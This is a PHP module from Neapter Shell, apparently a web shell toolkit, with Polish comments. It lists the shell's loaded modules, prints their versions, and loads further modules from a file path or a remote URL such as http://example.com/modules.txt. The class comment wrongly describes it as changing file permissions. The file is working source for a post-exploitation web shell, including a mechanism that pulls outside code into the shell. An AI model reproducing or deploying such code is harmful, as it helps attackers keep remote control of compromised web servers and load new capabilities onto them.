<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Zmienianie uprawnien dla pliku
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleModules extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array('modules');
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @todo - remove loaded modules
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
modules - Informacje o modułach

    Użycie:
        modules loaded - lista załadowanych modułów - polecenia
        modules version - wyświetlanie wersji modułów

        modules ścieżka_do_pliku_z_modułami

    Przykład:
        modules loaded
        modules version
        modules /tmp/modules
        modules http://example.com/modules.txt
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        $sParam = $this->oArgs->getParam(0);


        if ($this->oArgs->getNumberOfParams() !== 1) {
            return self::getHelp();
        }

        /**
         * Get list of all loaded modules
         */
        if ($sParam === 'loaded') {
            $aModules = $this->oUtils->getModules();

            return sprintf(
                "Załadowano %s modułów:\r\n    %s",
                count($aModules),
                implode("\r\n    ", $aModules)
            );
        }

        /**
         * Get details module information
         *
         * @example
         * ModuleEcho - 1.0.0 2011-06-04 - <krzotr@gmail.com>
         */
        if ($sParam === 'version') {
            $iMaxLen = 0;
            foreach ($this->oUtils->getModules() as $sModule) {
                if (($iLen = strlen($sModule)) > $iMaxLen) {
                    $iMaxLen = $iLen;
                }
            }

            $sOutput = '';
            foreach ($this->oUtils->getModules() as $sModule) {
                $sVersion = $sModule::getVersion();

                $sOutput .= sprintf(
                    "%-{$iMaxLen}s - %s\r\n",
                    $sModule,
                    $sVersion
                );
            }

            return htmlspecialchars($sOutput);
        }

        $bLoaded = $this->oUtils->loadModuleFromLocation($sParam);

        return sprintf("Moduł %szostał załadowany", ( !$bLoaded ? 'nie ' : ''));
    }

}
